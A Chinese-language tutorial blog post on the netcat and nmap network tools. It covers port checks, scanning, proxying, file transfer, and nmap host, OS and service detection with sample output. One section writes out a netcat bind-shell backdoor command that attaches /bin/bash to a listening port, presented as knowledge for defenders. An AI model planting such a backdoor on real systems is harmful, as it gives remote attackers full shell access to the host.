<!--
+++
title       = "netcat/nmap: 网络工具中里的“瑞士军刀”"
description = "1. netcat; 2. nmap: 专用于IP扫描工具"
date        = "2022-01-03"
tags        = []
categories  = ["1-os管理","14-command"]
series      = []
keywords    = []
weight      = 5
toc         = true
draft       = false
+++ -->

[TOC]

---

> [cnblog: nc工具使用](https://www.cnblogs.com/zhaijiahui/p/9028402.html)

## 1. netcat

netcat, 别名 `ncat` 或 `nc` ，拥有Windows和Linux的版本。因为它短小精悍,功能实用，被设计为一个简单、可靠的网络工具，可通过TCP或UDP协议传输读写数据。同时，它还是一个网络应用Debug分析器，因为它可以根据需要创建各种不同类型的网络连接。

### 1.1. 常用功能一览

nc的常用的几个参数如下所列：

1. `-l <port>`

    用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。

2. `-p <port>`

    暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数）

3. `-s`

    指定发送数据的源IP地址，适用于多网卡机

4. `-u`

    指定nc使用UDP协议，默认为TCP

5. `-n`

    直接使用IP地址，而不通过 DNS 域名服务器（可以加快扫描速度）。

5. `-v`

    显示详细信息，新手调试时尤为有用

6. `-w <seconds>`

    超时秒数，后面跟数字

7. `-z`

    表示zero，表示扫描时不发送任何数据。一般只在扫描通信端口时使用。

8. `-k`

    当客户端从服务端断开连接后，过一段时间服务端也会停止监听。但通过 `-k` 选项我们可以强制服务器保持连接并继续监听端口。

### 1.2. 验证端口的开放

```sh
ncat -vz http://www.baidu.com 80
```

### 1.3. 端口扫描

```sh
ncat -vzn 192.168.0.191 1-25555
```

### 1.4. 连接远程系统

```sh
ncat <ip_addr> <port>
# 例如: ncat 192.168.1.100 80
```

这会创建一个连接，连接到 IP 为 192.168.1.100 的服务器上的 80 端口，然后我们就可以向服务器发送指令了。 比如我们可以输入 `GET / HTTP/1.1` 来获取完整的网页内容。

### 1.5. 作为聊天工具

nc 也可以作为聊天工具来用，我们可以配置服务器监听某个端口，然后从远程主机上连接到服务器的这个端口，就可以开始发送消息了。

在服务器这端运行：

```sh
$ ncat -l 8080
```

远程客户端主机上运行：

```sh
$ ncat 192.168.1.100 8080
```

之后开始发送消息，这些消息会在服务器终端上显示出来。

### 1.6. 作为代理/转发数据

```sh
$ ncat -l 8080 | ncat 192.168.1.200 80
```

所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。

不过由于我们使用了管道，数据只能被单向传输。要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点:

```sh
$ mkfifo 2way
$ ncat -l 8080 0<2way | ncat 192.168.1.200 80 1>2way
```

### 1.7. 通过 nc 进行端口转发

我们通过选项 -c 来用 nc 进行端口转发，实现端口转发的语法为：

```sh
$ ncat -u -l  80 -c  'ncat -u -l 8080'
```

这样，所有连接到 80 端口的连接都会转发到 8080 端口。

### 1.8. 传输文件

nc 还能用来在系统间拷贝文件（当然不如ssh/scp安全），不过足够灵活。

在要接受数据的机器上启动 nc 并让它进入监听模式：

```sh
$ ncat -l  8080 > file.txt
```

现在去要被拷贝数据的机器上运行下面命令：

```sh
$ ncat 192.168.1.100 8080 --send-only < data.txt
```

这里，data.txt 是要发送的文件。 `-–send-only` 选项会在文件拷贝完后立即关闭连接。

如果不加该选项，我们需要手工按下 `ctrl+c` 来关闭连接。

### 1.9. 通过 nc 创建后门

nc 命令还可以用来在系统中创建后门，并且这种技术也确实被黑客大量使用。 为了保护我们的系统，我们需要知道它是怎么做的。 创建后门的命令为：

```sh
$ ncat -l 10000 -e /bin/bash
```

-e 标志将一个 bash 与端口 10000 相连。现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限：

```sh
$ ncat 192.168.1.100 10000
```

## 2. nmap: 专用于IP扫描工具
> [wechat: NMAP网络扫描工具](https://mp.weixin.qq.com/s/Tc4y59eICdNi3TxhZMvm2A)

### 2.1. 仅扫描IP地址（使用ping）

通过ping检测扫描目标网络中的活动主机（主机发现）

```sh
nmap   -sP  192.168.10.0/24
# 输出
Starting Nmap 6.40 ( http://nmap.org ) at 2020-12-22 16:46 CST
Nmap scan report for 192.168.0.1
Host is up (0.0013s latency).
Nmap scan report for 192.168.0.2
Host is up (0.0011s latency).
Nmap scan report for 192.168.0.3
Host is up (0.0041s latency).
Nmap scan report for 192.168.0.4
Host is up (0.019s latency).
Nmap scan report for 192.168.0.16
Host is up (0.00057s latency).
Nmap scan report for bbs.heroje.com (192.168.0.17)
Host is up (0.00050s latency).
...
Nmap done: 256 IP addresses (34 hosts up) scanned in 3.93 seconds
```

### 2.2. 扫描目标网段的常用TCP端口

```sh
nmap  -v  192.168.10.0/24
# 输出
...
Nmap scan report for 192.168.10.0 [host down]
Nmap scan report for 192.168.10.3 [host down]
...
Initiating Parallel DNS resolution of 1 host. at 13:24
Completed Parallel DNS resolution of 1 host. at 13:24, 0.06s elapsed
Initiating SYN Stealth Scan at 13:24
Scanning 3 hosts [1000 ports/host]
Discovered open port 53/tcp on 192.168.10.2
Completed SYN Stealth Scan against 192.168.10.2 in 0.13s (2 hosts left)
Discovered open port 445/tcp on 192.168.10.1
Discovered open port 135/tcp on 192.168.10.1
Discovered open port 5357/tcp on 192.168.10.1
Completed SYN Stealth Scan against 192.168.10.254 in 6.09s (1 host left)
Completed SYN Stealth Scan at 13:24, 6.23s elapsed (3000 total ports)
Nmap scan report for 192.168.10.1
Host is up (0.00017s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5357/tcp open  wsdapi
MAC Address: 00:50:56:C0:00:08 (VMware)
...
```

### 2.3. 检查IP范围192.168.10.2~192.168.10.4内，有哪些主机开放22端口

P0表示即使不能ping通也尝试检查

```sh
nmap   -P0   -p  22  192.168.10.2-4
# 输出
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 14:00 CST
Nmap scan report for bogon (192.168.10.2)
Host is up (0.00015s latency).

PORT   STATE  SERVICE
22/tcp closed ssh

Nmap scan report for bogon (192.168.10.4)
Host is up (0.00038s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 3 IP addresses (3 hosts up) scanned in 0.26 seconds
```

### 2.4. 检查目标主机的操作系统类型（OS指纹探测）

```sh
nmap  -O  192.168.10.2
# 输出
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 14:03 CST
Nmap scan report for bogon (192.168.10.2)
Host is up (0.0071s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: 00:50:56:FC:3E:15 (VMware)
Aggressive OS guesses: VMware Player virtual NAT device (99%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (93%), Microsoft Windows XP SP3 (93%), DVTel DVT-9540DW network camera (91%), DD-WRT v24-sp2 (Linux 2.4.37) (90%), Actiontec MI424WR-GEN3I WAP (90%), Linux 3.2 (90%), Linux 4.4 (90%), BlueArc Titan 2100 NAS device (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.86 seconds
```

### 2.5. 检查目标主机上某个端口对应的服务程序版本

```sh
nmap  -sV  -p  22  192.168.10.4
# 输出
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 14:05 CST
Nmap scan report for bogon (192.168.10.4)
Host is up (0.000032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3p1 Debian 1 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

### 2.6. 指定扫描目标主机的哪些端口

```sh
nmap  -p 21,22,23,53,80 192.168.10.4
# 输出
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 14:09 CST
Nmap scan report for bogon (192.168.10.4)
Host is up (0.000018s latency).

PORT   STATE  SERVICE
21/tcp closed ftp
22/tcp open   ssh
23/tcp closed telnet
53/tcp closed domain
80/tcp closed http

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
```

### 2.7. 检测目标主机是否开放DNS、DHCP服务

```sh
nmap -sU -p 53,67 192.168.10.2
# 输出
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 13:37 CST
Nmap scan report for 192.168.10.2
Host is up (0.0023s latency).

PORT   STATE         SERVICE
53/udp open          domain
67/udp open|filtered dhcps
MAC Address: 00:50:56:F0:09:FE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
```

### 2.8. 检测目标主机是否启用防火墙过滤

```sh
nmap -sA 192.168.10.4
# 输出
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 13:34 CST
Nmap scan report for 192.168.10.4
Host is up (0.0000020s latency).
All 1000 scanned ports on 192.168.10.4 are unfiltered

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
```
